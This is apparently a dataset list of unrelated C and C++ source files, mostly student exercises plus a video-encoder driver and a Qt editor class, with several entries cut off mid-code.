   cout << \"\\n please enter the following data  : \\n\\n\\n\";\n    cout << \"        power  (KW)  =  \"; cin >> P; cout << endl;\n    cout << \"  anglur speed (rpm) =  \"; cin >> w; cout << endl;\n    do {\n        cout << \"    reduction ratio  =  \"; cin >> u; cout << endl;\n        if (u > 10 || u < 0)\n        {\n            cout << \"\\n wrong : The reduction ratio is over design it shloud be 4>u>0: \\n\\n\";\n            cout << \" please enter a new u  \\n\\n\";\n        }\n        else\n            break;\n    } while (true);\n    do {\n        string c;\n\n        do {\n            cout << \"        module  (mm/tooth)  =  \"; cin >> mn; cout << endl;\n            string y, x = \"4\";\n            double r;\n            r = stod(module[0][0]);\n            if (mn == r)\n            {\n                break;\n            }\n            else {\n                for (int i = 1; i < 51; i++) {\n                    y = module[i][0].substr(1, module[i][0].length() - 1);\n                    r = stod(y);\n                    if (mn == r) {\n                        x = \"5\";\n                    }\n                }\n                if (x == \"5\")\n                    break;\n                else {\n                    cout << \"\\n this module is not found  !\" << endl << endl;\n                    for (int i = 1; i < 51; i++) {\n                        y = module[i][0].substr(1, module[i][0].length() - 1);\n                        r = stod(y);\n                        if (mn < r) {\n                            cout << \"\\n the nearst values to your module is  ( \" << module[i][0].substr(1, module[i][0].length() - 1) << \"  ,  \" << module[i - 1][0].substr(1, module[i - 1][0].length() - 1) << \" )\\n\";\n                            cout << \" please enter a new module  \\n\\n\";\n                            break;\n                        }\n                    }\n                }\n            }\n        } while (true);\n        m = mn / cos(gama);\n        cout << \"\\n  m = \" << m << \"\\n\\n\";\n        do {\n            cout << \"\\n     the maximum of pinion diameter is  =  \"<< (50 * 120*1000) / (w*2*3.14159)<<\" mm \\n\\n\";\n            cout << \"\\n    pinion diameter  =  \"; cin >> Dp; cout << endl << endl;\n            \n            Dg = u * Dp;\n            V = (w * Dp * 2 * 3.14159) / (60 * 2 * 1000);\n            float exm = fmod(Dp, m);\n            exm = double(int(exm * 1000)) / 1000;\n            \n            if (V > 50)\n                cout << \"  wrong : The Velocity of pinion = \" << V << \" (m/s)  \\n It is over design , it shloud be V<20  m/s \\n to help...decrease the pinion diameter\\n\\n\";\n            else if ((exm / m) != 0.0)\n            {\n\n                cout << \"  wrong : The number of teeth = \" << Dp / m << \" (mm) and exm = \" << exm << \" \\n It is over design , it shloud be integer number ....change the pinion diameter   \\n\";\n                cout << \"\\n the nearst values to your pinion diameter is  ( \"",
    "// Mehmet Selman Yilmaz 31158 CS300 Homework1\n\n#include <iostream>\n#include <string>\n#include<fstream>\n#include \"dStack.h\"\n#include \"randgen.h\"\n#include <sstream>\n\n\nusing namespace std;\n\n/*\n *The purpose of this program is to build a maze.\n * While doing this, it breaks walls randomly, if there is no wall suitable for breaking,\n * it turns back and continues to break from the nearest wall suitable for breaking.\n *\n *It provides the solution with the same logic.\n * The only difference is, instead of breaking a wall, you go to that cell if there is no wall.\n *\n */\n\n\n\n\n// Structure to store coordinates\n//This struct will be created in order to not keep current pointer's information\nstruct mazeBreakerElem{\n    int x;\n    int y;\n\n    // Constructors\n    mazeBreakerElem() : x(-1), y(-1) {} //Default\n    mazeBreakerElem(int xElem,int yElem) : x(xElem), y(yElem) {} //Parametrized\n};\n\n// Function to get maze inputs from the user\nvoid getMazeInputs(int & mazeQuantity, int & mazeRow, int & mazeColumn)\n{\n\n    cout << \"Enter the number of mazes: \";\n    cin >> mazeQuantity;\n    cout << \"Enter the number of rows and columns (M and N): \";\n    cin >> mazeRow >> mazeColumn;\n}\n// Function to get path inputs from the user\nvoid getPathInputs(int & mazeID, int & entryX,int & entryY,int & exitX,int & exitY,int mazeQuantity)\n{\n    cout << \"\\nEnter a maze ID between 1 \" << \"to \"<< mazeQuantity <<\" inclusive to find a path: \";\n    cin >> mazeID;\n    cout << \"Enter x and y coordinates of the entry points (x,y) or (column,row): \";\n    cin >> entryX >> entryY;\n    cout << \"Enter x and y coordinates of the exit points (x,y) or (column,row): \";\n    cin >> exitX >> exitY;\n}\n// Function to create all walls in the maze (It doesn't make a maze, it just fills all the walls)\nvoid createAllWalls(dStack<cell> & Maze, int mazeRow,int mazeColumn)\n{\n    for(int i = mazeRow-1; i>=0;i--)\n    {\n        for(int j = mazeColumn -1; j>=0;j--)\n        {\n\n            cell newCell(j, i, true, true, true, true, false, 0);\n\n            // Assign unbreakable walls based on position\n            //1=left is unbreakable, 2 right is uB, 3 up is uB, 4 down is uB, 5 left and up, 6 left and down, 7 right and up, 8 right and down\n            if(i == 0 && j == 0){newCell.unbreakable =6;}\n            else if(j==mazeColumn-1 && i == 0){newCell.unbreakable = 8;}\n            else if(j==0 && i == mazeRow-1){newCell.unbreakable = 5;}\n            else if(j==mazeColumn-1 && i== mazeRow-1){newCell.unbreakable = 7;}\n            else if(j== 0 ){newCell.unbreakable = 1;}\n            else if(j==mazeColumn-1){newCell.unbreakable = 2;}\n            else if(i== mazeRow-1 ){newCell.unbreakable = 3;}\n            else if(i==0 ){newCell.unbreakable = 4;}\n\n            Maze.push(newCell);\n\n\n        }\n    }\n}\ntemplate<class T>\n// Function to check if all cells in the maze have been visited\nbool isAllVisited(dStack<T> & Maze)\n{\n\n    bool check = true;\n    cell x;\n    dStack<cell> temp;\n\n    while(!Maze.isEmpty())\n    {\n        Maze.pop(x);\n        temp.push(x);\n    }\n\n    while(!temp.isEmpty())\n    {\n        temp.pop(x);\n        Maze.push(x);\n        //If one of the cells is unvisited return false\n        if(!x.isVisited)\n        {\n            check = false;\n        }\n    }\n    //If none of the cell is unvisited return true\n    return check;\n\n}\n\n\n\n\n// Function to check if a move is possible in order to break to wall\nbool isPossibleMove (sNode<cell> * current, dStack<cell> & Maze, int & breaker,int mazeRow, int mazeColumn)\n{\n    RandGen rnd; // Set seed for Randgen\n    cell x;\n    bool imRight = false ,imLeft = false ,imUp=false,imDown=false;\n    dStack<cell> temp;\n\n    //Choose random wall breaker\n    breaker = rnd.RandInt(1,4); // Choose a random direction (1: left, 2: right, 3: up, 4: down)\n\n    //Transfer elements to the temp\n    while(!Maze.isEmpty())\n    {\n        Maze.pop(x);\n        temp.push(x);\n    }\n    // Check neighboring cells in temp stack in order to see which walls are not possible for breaking\n    while(!temp.isEmpty())\n    {\n        temp.pop(x);\n        //Check the right\n        if(x.xCoordinate == current->element.xCoordinate+1 && x.yCoordinate == current->element.yCoordinate)\n        {\n            if(x.isVisited)\n            {imRight=true;}\n        }\n        //Check the left\n        if(x.xCoordinate == current->element.xCoordinate-1 && x.yCoordinate == current->element.yCoordinate)\n        {\n            if(x.isVisited)\n            {imLeft = true;}\n        }\n        //Check the up\n        if(x.xCoordinate == current->element.xCoordinate && x.yCoordinate == current->element.yCoordinate+1)\n        {\n            if(x.isVisited)\n            {imUp=true;}\n        }\n        //Check the down\n        if(x.xCoordinate == current->element.xCoordinate && x.yCoordinate == current->element.yCoordinate-1)\n        {\n            if(x.isVisited)\n            {imDown = true;}\n        }\n        // Additional checks for unbreakable walls based on current cell's position\n        if(current->element",
    "/*\n\u0417\u0430\u0434\u0430\u043d\u0438\u0435 4. \u0420\u044f\u0434 \u0447\u0438\u0441\u0435\u043b* (\u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0435 \u0437\u0430\u0434\u0430\u043d\u0438\u0435)\n\n\u0427\u0442\u043e \u043d\u0443\u0436\u043d\u043e \u0441\u0434\u0435\u043b\u0430\u0442\u044c:\n\u0412 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u043d \u043c\u0430\u0441\u0441\u0438\u0432 \u0438\u0437 15 \u0446\u0435\u043b\u044b\u0445 \u043f\u043e\u043b\u043e\u0436\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0445 \u0447\u0438\u0441\u0435\u043b. \u042d\u0442\u0438 \u0447\u0438\u0441\u043b\u0430 \u044f\u0432\u043b\u044f\u044e\u0442\u0441\u044f \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e\u043c \u0438\u0437 14 \u043f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u0445 \u0447\u0438\u0441\u0435\u043b, \n\u043d\u0430\u0447\u0438\u043d\u0430\u044f \u0441 \u0425 (\u0425 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043b\u044e\u0431\u044b\u043c), \u0430 \u043e\u0434\u043d\u043e \u0447\u0438\u0441\u043b\u043e \u0438\u0437 \u0440\u044f\u0434\u0430 \u043f\u043e\u0432\u0442\u043e\u0440\u044f\u0435\u0442\u0441\u044f. \u041d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u043d\u0430\u0439\u0442\u0438 \u043f\u043e\u0432\u0442\u043e\u0440\u044f\u044e\u0449\u0435\u0435\u0441\u044f \u0447\u0438\u0441\u043b\u043e \u0438 \u0432\u044b\u0432\u0435\u0441\u0442\u0438 \u0435\u0433\u043e \u0432 \u043a\u043e\u043d\u0441\u043e\u043b\u044c. \n\u041f\u043e \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u043c\u0438\u043d\u0438\u043c\u0443\u043c \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0439 \u043f\u0430\u043c\u044f\u0442\u0438 \u0438 \u043f\u0440\u043e\u0445\u043e\u0434\u043e\u0432 \u043f\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0443.\n\n\u041f\u0440\u0438\u043c\u0435\u0440:\n\nint numbers[15] = {114, 111, 106, 107, 108, 105, 115, 108, 110, 109, 112, 113, 116, 117, 118}\n\u0412 \u0434\u0430\u043d\u043d\u043e\u043c \u043f\u0440\u0438\u043c\u0435\u0440\u0435 \u0425 \u2014 \u044d\u0442\u043e 105, \u0430 \u043f\u043e\u0432\u0442\u043e\u0440\u044f\u044e\u0449\u0435\u0435\u0441\u044f \u0447\u0438\u0441\u043b\u043e \u2014 108.\n*/\n\n#include <iostream>\n\nusing namespace std;\n\nint main(){\n    int numbers[15] = {114, 111, 106, 107, 108, 105, 115, 108, 110, 109, 112, 113, 116, 117, 118};\n\n    int min = numbers[0];\n    int sum_common = 0;\n\n    for (int i =0; i<15; ++i){\n        if (numbers[i] < min){\n            min = numbers[i];\n        }\n        sum_common +=numbers[i];\n    }\n\n    int sum_sequence = 0;\n    for (int i=0; i<14; ++i){\n        sum_sequence+=min;\n        min+=1;\n    }\n\n    cout << sum_common - sum_sequence;\n}",
    "/* Nama        : Nico Ardy Hermawan */\n/* NIM         : 230401010076 */\n/* Kelas       : IT201 */\n/* Mata Kuliah : Struktur Data dan Algoritma */\n\n#include <iostream>\n#include <algorithm>\nusing namespace std;\n\nstruct Element {\n    int value, index;\n};\n\n// Fungsi untuk membandingkan element\nbool compareElement(Element a, Element b){\n    return a.value < b.value;\n}\n\n// Fungsi Binary Search\nint binarySearch(Element arr[], int l, int r, int x){\n    while (l <= r) {\n        int mid = l + (r - l) / 2;\n        if (arr[mid].value == x) {\n            return mid;\n        }\n        if (arr[mid].value < x) {\n            l = mid + 1;\n        } else {\n            r = mid - 1;\n        }\n    }\n    return -1;   \n}\n\n// Fungsi mencari index element\nvoid searchElement(int arr[], int n, int x){\n    Element elements[n];\n    for (int i = 0; i < n; i++) {\n        elements[i].value = arr[i];\n        elements[i].index = i + 1;\n    }\n\n    sort(elements, elements + n, compareElement);\n\n    int result = binarySearch(elements, 0, n - 1, x);\n\n    // Jika elemen ditemukan\n    if (result != -1) {\n        cout << \"Angka \" << x << \" ada di indeks ke \" << elements[result].index;\n        // Cek elemen sebelum dan sesudah untuk menangani duplikasi\n        int left = result - 1;\n        while (left >= 0 && elements[left].value == x) {\n            cout << \" dan \" << elements[left].index;\n            left--;\n        }\n        int right = result + 1;\n        while (right < n && elements[right].value == x) {\n            cout << \" dan \" << elements[right].index;\n            right++;\n        }\n        cout << endl;\n    } else {\n        cout << \"Angka \" << x << \" tidak ada dalam array\" << endl;\n    }\n}\n\nint main(){\n    int arr[] = {19, 40, 10, 90, 2, 50, 60, 50, 1};\n    int n = sizeof(arr) / sizeof(arr[0]);\n\n    // Test case 1\n    int x = 1;\n    cout << \"Input: \" << x << endl;\n    searchElement(arr, n, x);\n    cout << endl;\n\n    // Test case 2\n    x = 50;\n    cout << \"Input: \" << x << endl;\n    searchElement(arr, n, x);\n    cout << endl;\n\n    // Test case 3\n    x = 80;\n    cout << \"Input: \" << x << endl;\n    searchElement(arr, n, x);\n    cout << endl;\n\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\ntypedef struct Node\n{\n    int data;\n    Node *next;\n} Node;\n\nvoid display(Node *head)\n{\n    Node *p = head;\n    // we have used do while as first time only p points to head\n    // so first print it, then check\n\n    if (head == NULL)\n    {\n        printf(\"EMPTY LIST\");\n    }\n    else\n    {\n        printf(\"List : \");\n        do\n        {\n            printf(\"%d \", p->data);\n            p = p->next;\n        } while (p != head);\n        printf(\"\\n\");\n    }\n}\nvoid display_recurse(Node *head)\n{\n    static int flag = 0; // to see if p is traversing for first time\n                         // static to keep only 1 record of flag\n    Node *p = head;\n    if (p != head || flag == 0)\n    {\n        flag = 1;\n        printf(\"%d\", p->data);\n        display_recurse(p->next);\n    }\n}\n\nint count(Node *head)\n{\n    Node *p = head;\n    int c = 0;\n    if (head == NULL)\n    {\n        c = 0;\n        return c;\n    }\n    else\n    {\n        do\n        {\n            c++;\n            p = p->next;\n        } while (p != head);\n    }\n    return c;\n}\n\nNode *create(Node *head, Node *last)\n{\n    int n, i;\n    srand(time(NULL));\n    printf(\"Enter how many elements to enter: \");\n    scanf(\"%d\", &n);\n\n    if (n == 0)\n    {\n        head = NULL;\n        return head;\n    }\n    for (i = 0; i < n; i++)\n    {\n        Node *t = (Node *)malloc(sizeof(Node));\n        // scanf(\"%d\", &t->data);\n        t->data = (int)rand() % 10;\n\n        if (head == NULL)\n        {\n            head = last = t;\n            t->next = head;\n        }\n        else\n        {\n            t->next = last->next;\n            last->next = t;\n            last = t;\n        }\n    }\n    return head;\n}\n\nNode *insert_begin(Node *head, int x)\n{\n    Node *p = head;\n    Node *t = (Node *)malloc(sizeof(Node));\n    t->data = x;\n    t->next = NULL;\n\n    // base condn: empty list\n    if (head == NULL)\n    {\n        head = t;\n        t->next = head; // point to itself\n    }\n    else\n    {\n        t->next = head;         // first node exists\n        while (p->next != head) // traverse to last node\n            p = p->next;\n        p->next = t;\n        head = t; //  <------ this line\n    }\n    return head;\n}\n\n// insert last is basically insert first, but head does not change\nNode *insert_last(Node *head, int x)\n{\n    Node *p = head;\n    Node *t = (Node *)malloc(sizeof(Node));\n    t->data = x;\n    t->next = NULL;\n\n    if (head == NULL)\n    {\n        head = t;\n        t->next = head;\n    }\n    else\n    {\n        t->next = head;\n        while (p->next != head)\n            p = p->next;\n        p->next = t;\n    }\n    return head;\n}\n\nNode *insert(Node *head, int x, int index)\n{\n    Node *p = head;\n    Node *t = (Node *)malloc(sizeof(Node));\n    t->data = x;\n    t->next = NULL;\n\n    if (index <= 0 || index > count(head) + 1) // count+1 to add node at end\n    {\n        printf(\"Index Error: Index Out of Bounds\");\n        return head; // no need to change head, return whatever it is\n    }\n    else\n    {\n        if (index == 1)\n        {\n            // base case: empty list\n            if (head == NULL)\n            {\n                head = t;\n                t->next = head;\n            }\n            else\n            {\n                // insertion at beginning\n                t->next = head;\n                // traverse till p reaches last node\n                while (p->next != head)\n                    p = p->next;\n\n                // link last node to new node and head to the node\n                p->next = t;\n                head = t;\n            }\n        }\n        else\n        {\n            p = head;\n            // insert at index\n            for (int i = 1; i < index - 1; i++)\n            {\n                p = p->next;\n            }\n            t->next = p->next;\n            p->next = t;\n        }\n    }\n    return head;\n}\n\nNode *delete_n(Node *head, int index)\n{\n    int x;\n    Node *p = head;\n\n    if (count(head) == 0)\n    {\n        printf(\"You cannot delete in empty list\");\n        return head; // head is NULL here\n    }\n    if (index <= 0 || index > count(head))\n    {\n        printf(\"Invalid Index Error: Index out of Bounds\\n\");\n        return head;\n    }\n    else\n    {\n        if (index == 1)\n        {\n            while (p->next != head)\n                p = p->next;\n            x = head->data;\n\n            if (p == head)\n            {\n                // delete the one and only node of linked list\n                free(head);\n                head = NULL;\n            }\n            else\n            {\n                // no. of nodes > 1\n                p->next = head->next;\n                free(head);\n                head = p->next;\n\n                printf(\"%d is deleted\\n\", x);\n            }\n        }\n        else\n        {\n            Node *q;\n            p = head;\n            for (int i = 1; i < index - 1; i++)\n                p = p->next;\n            q = p->next; // q is the nth index node to be deleted\n            x = q->data;\n            p->next =",
    "/*--------------------------------------------------------------------------\nCopyright (c) 2010-2020, The Linux Foundation. All rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet:\n    * Redistributions of source code must retain the above copyright\n      notice, this list of conditions and the following disclaimer.\n    * Redistributions in binary form must reproduce the above\n      copyright notice, this list of conditions and the following\n      disclaimer in the documentation and/or other materials provided\n      with the distribution.\n    * Neither the name of The Linux Foundation nor the names of its\n      contributors may be used to endorse or promote products derived\n      from this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\nWARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\nARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\nBE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\nBUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\nWHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\nOR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\nIF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n--------------------------------------------------------------------------*/\n\n#include \"video_encoder_device_v4l2.h\"\n#include \"omx_video_encoder.h\"\n\n#undef LOG_TAG\n#define LOG_TAG \"OMX-VENC: venc_dev\"\n\nvoid venc_dev::venc_get_consumer_usage(OMX_U32* usage)\n{\n\n    OMX_U32 eProfile = 0;\n    bool hevc = venc_get_hevc_profile(&eProfile);\n\n    /* Initialize to zero & update as per required color format */\n    *usage = 0;\n\n    /* Configure UBWC as default if target supports */\n#ifdef _UBWC_\n    *usage |= GRALLOC_USAGE_PRIVATE_ALLOC_UBWC;\n#endif\n\n    if (hevc &&\n        (eProfile == (OMX_U32)OMX_VIDEO_HEVCProfileMain10HDR10 ||\n         eProfile == (OMX_U32)OMX_VIDEO_HEVCProfileMain10 ||\n         eProfile == (OMX_U32)OMX_VIDEO_HEVCProfileMain10HDR10Plus)) {\n        DEBUG_PRINT_INFO(\"Setting 10-bit consumer usage bits\");\n        *usage |= GRALLOC_USAGE_PRIVATE_10BIT_VIDEO;\n        if (mUseLinearColorFormat & REQUEST_LINEAR_COLOR_10_BIT) {\n            *usage &= ~GRALLOC_USAGE_PRIVATE_ALLOC_UBWC;\n            DEBUG_PRINT_INFO(\"Clear UBWC consumer usage bits as 10-bit linear color requested\");\n        }\n    } else if (mUseLinearColorFormat & REQUEST_LINEAR_COLOR_8_BIT ||\n            m_codec == OMX_VIDEO_CodingImageHEIC) {\n        *usage &= ~GRALLOC_USAGE_PRIVATE_ALLOC_UBWC;\n        DEBUG_PRINT_INFO(\"Clear UBWC consumer usage bits as 8-bit linear color requested\");\n    }\n\n    if (venc_handle->is_flip_conv_needed(NULL))\n        *usage = *usage | GRALLOC_USAGE_SW_READ_OFTEN;\n\n    if (m_codec == OMX_VIDEO_CodingImageHEIC) {\n        DEBUG_PRINT_INFO(\"Clear UBWC and set HEIF consumer usage bit\");\n        *usage &= ~GRALLOC_USAGE_PRIVATE_ALLOC_UBWC;\n        *usage |= GRALLOC_USAGE_PRIVATE_HEIF_VIDEO;\n    }\n\n    DEBUG_PRINT_INFO(\"venc_get_consumer_usage 0x%x\", *usage);\n}\n\nbool venc_dev::venc_set_config(void *configData, OMX_INDEXTYPE index)\n{\n\n    if (is_streamon_done(PORT_INDEX_IN)) {\n        if (venc_store_dynamic_config(index, configData)) {\n            DEBUG_PRINT_HIGH(\"dynamic config %#X successfully stored.\", index);\n            return true;\n        }\n\n        /* If failed, try to handle the dynamic config immediately */\n        DEBUG_PRINT_ERROR(\"Store dynamic config %#X failed\", index);\n    }\n\n    DEBUG_PRINT_LOW(\"Inside venc_set_config\");\n\n    switch ((int)index) {\n        case OMX_IndexConfigVideoBitrate:\n            {\n                OMX_VIDEO_CONFIG_BITRATETYPE *bit_rate = (OMX_VIDEO_CONFIG_BITRATETYPE *)\n                    configData;\n                DEBUG_PRINT_LOW(\"venc_set_config: OMX_IndexConfigVideoBitrate\");\n                if (!venc_config_bitrate(bit_rate))\n                    return false;\n\n                break;\n            }\n        case OMX_IndexConfigVideoFramerate:\n            {\n                OMX_CONFIG_FRAMERATETYPE *frame_rate = (OMX_CONFIG_FRAMERATETYPE *)\n                    configData;\n                DEBUG_PRINT_LOW(\"venc_set_config: OMX_IndexConfigVideoFramerate\");\n                if (!venc_config_framerate(frame_rate))\n                    return false;\n\n                break;\n            }\n        case QOMX_IndexConfigVideoIntraperiod:\n            {\n                DEBUG_PRINT_LOW(\"venc_set_param:QOMX_IndexConfigVideoIntraperiod\");\n                QOMX_VIDEO_INTRAPERIODTYPE *intraperiod =\n                    (QOMX_VIDEO_INTRAPERIODTYPE *)configData;\n\n                if (set_nP_frames(intraperiod->nPFrames) == false ||\n           ",
    "// Copyright (C) 2016 Lorenz Haas\n// SPDX-License-Identifier: LicenseRef-Qt-Commercial OR GPL-3.0+ OR GPL-3.0 WITH Qt-GPL-exception-1.0\n\n#include \"command.h\"\n\nnamespace TextEditor {\n\nbool Command::isValid() const\n{\n    return !m_executable.isEmpty();\n}\n\nQString Command::executable() const\n{\n    return m_executable;\n}\n\nvoid Command::setExecutable(const QString &executable)\n{\n    m_executable = executable;\n}\n\nQStringList Command::options() const\n{\n    return m_options;\n}\n\nvoid Command::addOption(const QString &option)\n{\n    m_options << option;\n}\n\nCommand::Processing Command::processing() const\n{\n    return m_processing;\n}\n\nvoid Command::setProcessing(const Processing &processing)\n{\n    m_processing = processing;\n}\n\nbool Command::pipeAddsNewline() const\n{\n    return m_pipeAddsNewline;\n}\n\nvoid Command::setPipeAddsNewline(bool pipeAddsNewline)\n{\n    m_pipeAddsNewline = pipeAddsNewline;\n}\n\nbool Command::returnsCRLF() const\n{\n    return m_returnsCRLF;\n}\n\nvoid Command::setReturnsCRLF(bool returnsCRLF)\n{\n    m_returnsCRLF = returnsCRLF;\n}\n\n} // namespace TextEditor\n",
    "/*\nhttps://leetcode.com/problems/find-the-duplicate-number/description/\n*/\n\n\n/*\nIt can be solved easily using method 2 code, but the question said to solve it without modifying the input array\nand in constant space. Hence this neetcode approach of solving using start point of cycle in LL approach\n*/\nclass Solution {\npublic:\n    int findDuplicate(vector<int>& nums) {\n        // starting with the respective second positions of slow and fast, because if I start from the same slow and fast\n        // then the while loop would not run only because of the condition while(slow != fast)\n        int slow = nums[nums[0]], fast = nums[nums[nums[0]]];\n        while(slow != fast) {\n            slow = nums[slow];\n            fast = nums[nums[fast]];\n        }\n\n        slow = nums[0];\n        while(slow != fast) {\n            slow = nums[slow];\n            fast = nums[fast];\n        }\n\n        return slow;\n   }\n};\n\n\n\n// Method 2\nclass Solution {\npublic:\n    int findDuplicate(vector<int>& nums) {\n        int idx;\n        for(int i : nums) {\n            idx = abs(i);\n            if(nums[idx] < 0) return idx;\n            else nums[idx] *= -1;\n        }\n\n        return idx;\n    }\n};",
    "#include<stdio.h>\r\n#include<string.h>\r\n#include<math.h>\r\n#include<stdlib.h>\r\nstruct student \r\n{\r\n\tchar name[30],course_name[5],accomodation[10],mobile_no[10];\r\n\tint i_marks,eamcet;\r\n\tfloat ssc_grade;\r\n\tint p_fee,t_fee,d_fee;\r\n}s[100];\r\nstruct faculty\r\n{\r\n\tchar name[30],accomodation[10],email[20],mobile_no[10],sub_name[10];\r\n\tint l_id,salary,experience;\r\n\tfloat rating,attendence;\r\n}f[100];\r\nstruct sports\r\n{\r\n\tchar all_sports[15],staff[20];\r\n\tint ground_no,equipments;\r\n\tfloat ground_area;\r\n}gm[100];\r\nstruct admissions\r\n{\r\n\tchar type[10],section[5];\r\n\tfloat p_fee,t_fee,l_fee;\r\n}a;\r\nstruct buses\r\n{\r\n\tchar destination[20];\r\n\tint buses,rbus_count,timings;\r\n\tfloat bus_fees;\r\n}b;\r\nstruct hostel\r\n{\r\n\tchar details[30];\r\n\tint room_no,warden_no;\r\n\tfloat fees;\r\n}h;\r\nstruct college\r\n{\r\n\tchar avialble_courses[5];\r\n\tint classes,blocks,labs,students,sec_id,timings;\r\n\tfloat class_pass_percentage;\r\n}c;\r\nstruct employee\r\n{\r\n\tchar name[30];\r\n\tint mobile_no,salary;\r\n}e;\r\nvoid print_student();\r\nvoid print_faculty();\r\nvoid print_sports();\r\nvoid print_transport();\r\nvoid print_hostel();\r\nvoid print_college();\r\nvoid print_employee();\r\nvoid print_admissions();\r\nvoid print_cse();\r\nvoid print_ece();\r\nvoid print_eee();\r\nvoid print_civil();\r\nvoid print_mech();\r\nvoid print_teaching();\r\nvoid print_non_teaching();\r\nvoid print_outdoor();\r\nvoid print_indoor();\r\nvoid print_boys_hostel();\r\nvoid print_girls_hostel();\r\nmain()\r\n{\r\n\tstruct student s[100];\r\n\tstruct faculty f[50];\r\n\tstruct sports gm[100];\r\n\tstruct admissions a;\r\n\tstruct buses b;\r\n\tstruct hostel h;\r\n\tstruct employee e;\r\n\tstruct college c;\r\n\tint i,n,ch;\r\n\tint sport,hostel;\r\n\tdo\r\n{\r\n\tprintf(\"\\n\\n------------------------------------------------------COLLEGE MANAGEMENT SYSTEM------------------------------------------------------\\n\\n\");\r\n\tprintf(\"\\t\\t\\t\\t\\t1.Student's Information\\n\");\r\n\tprintf(\"\\t\\t\\t\\t\\t2.Faculty's Information\\n\");\r\n\tprintf(\"\\t\\t\\t\\t\\t3.Sports Information\\n\");\r\n\tprintf(\"\\t\\t\\t\\t\\t4.Transport Information\\n\");\r\n\tprintf(\"\\t\\t\\t\\t\\t5.Hostel Information\\n\");\r\n\tprintf(\"\\t\\t\\t\\t\\t6.College's Information\\n\");\r\n\tprintf(\"\\t\\t\\t\\t\\t7.Employee's Information\\n\");\r\n\tprintf(\"\\t\\t\\t\\t\\t8.Admissions Information\\n\");\r\n\tprintf(\"\\t\\t\\t\\t\\t9.Exit\\n\");\r\n\tprintf(\"Enter your choice:\");\r\n\tscanf(\"%d\",&ch);\r\n\t\r\n\t\tswitch(ch)\r\n\t\t{\r\n\t\t\tcase 1:\r\n\t\t\t\tprintf(\"__WELCOME TO STUDENTS PORTAL__\\n\");\r\n\t\t\t\t\tint choice;\r\n\t\t\t\t\tprintf(\"Avialable branches:\\n\\n\");\r\n\t\t\t\t\tprintf(\"1 CSE\\n\");\r\n\t\t\t\t\tprintf(\"2 ECE\\n\");\r\n\t\t\t\t\tprintf(\"3 EEE\\n\");\r\n\t\t\t\t\tprintf(\"4 CIVIL\\n\");\r\n\t\t\t\t\tprintf(\"5 MECH\\n\\n\");\r\n\t\t\t\t\tprintf(\"Select the branch:\\n\");\r\n\t\t\t\t\tscanf(\"%d\",&choice);\r\n\t\t\t\t\tif(choice==1)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tprint_cse();\r\n\t\t\t\t\t\tprintf(\"Thank you for visiting students portal\\n\");\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if(choice==2)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tprint_ece();\r\n\t\t\t\t\t\tprintf(\"Thank you for visiting students portal\\n\");\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if(choice==3)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tprint_eee();\r\n\t\t\t\t\t\tprintf(\"Thank you for visiting students portal\\n\");\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if(choice==4)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tprint_civil();\r\n\t\t\t\t\t\tprintf(\"Thank you for visiting students portal\\n\");\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if(choice==5)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tprint_mech();\r\n\t\t\t\t\t\tprintf(\"Thank you for visiting students portal\\n\");\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tprintf(\"Invalid Choice\\n\");\r\n\t\t\t\t\t\tprintf(\"Thank you for visiting students portal\\n\");\r\n\t\t\t\t\t\tprintf(\"------------------------Thank you---------------------------- \\n\");\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\t\r\n\t\t\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tprintf(\"----------------------------------WELCOME TO FACULTYS PORTAL------------------------------\\n\");\r\n\t\t\t\t\tint 